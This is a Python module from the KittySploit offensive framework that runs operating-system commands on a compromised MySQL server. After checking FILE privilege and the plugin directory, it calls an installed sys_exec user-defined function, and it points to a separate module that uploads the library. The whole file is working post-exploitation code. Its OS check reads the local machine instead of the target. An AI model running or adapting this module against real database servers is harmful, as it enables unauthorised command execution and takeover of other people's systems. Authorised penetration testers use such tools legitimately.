from kittysploit import *
from lib.protocols.mysql.mysql_client import MySQLClient
import platform

class Module(Post, MySQLClient):

	__info__ = {
		"name": "MySQL UDF Command Execution",
		"description": "Execute system commands via MySQL UDF (User Defined Functions) - requires FILE privilege",
		"author": "KittySploit Team",
		"session_type": SessionType.MYSQL,
	}	

	command = OptString("id", "Command to execute", True)
	udf_lib_path = OptString("", "Path to UDF library (auto-detect if empty)", False)

	def run(self):
		"""Execute command via MySQL UDF"""
		try:
			if not self.check_privilege('FILE'):
				raise ProcedureError(FailureType.NotAccess, "FILE privilege required for UDF exploitation")
			
			print_success("FILE privilege confirmed")
			
			secure_file_priv = self.get_secure_file_priv()
			if secure_file_priv and secure_file_priv != '':
				print_warning(f"secure_file_priv is set to: {secure_file_priv}")
				print_info("UDF exploitation may be limited")
			
			plugin_dir = self.get_plugin_dir()
			if not plugin_dir:
				raise ProcedureError(FailureType.NotAccess, "Cannot determine plugin directory")
			
			print_info(f"Plugin Directory: {plugin_dir}")
			
			# Determine OS and architecture
			system = platform.system().lower()
			if 'linux' in system:
				os_type = 'linux'
			elif 'win' in system or 'nt' in system:
				os_type = 'windows'
			else:
				raise ProcedureError(FailureType.NoTarget, f"Unsupported OS: {system}")
			
			# For now, we'll use a simpler approach: create a function that uses sys_exec
			# Note: This requires the sys_exec UDF to be already installed
			# In a real scenario, you would need to upload the UDF library first
			
			print_warning("UDF exploitation requires the UDF library to be installed first")
			print_info("This module attempts to use existing UDF functions")
			print_info("For full exploitation, use: mysql/exploits/udf_upload")
			
			# Try to use sys_exec if available
			try:
				result = self.execute_query("SELECT sys_exec(%s) as result", (self.command,), fetch_all=False)
				if result:
					output = result.get('result', '')
					if output:
						print_success("Command executed:")
						print_info(output)
						return True
			except ProcedureError as e:
				if "does not exist" in str(e) or "Unknown function" in str(e):
					print_warning("sys_exec UDF not available")
					print_info("You may need to upload and install the UDF library first")
					raise ProcedureError(FailureType.NotAccess, "UDF function not available. Use mysql/exploits/udf_upload first.")
				else:
					raise
			
			return True
			
		except ProcedureError:
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error executing command: {e}")

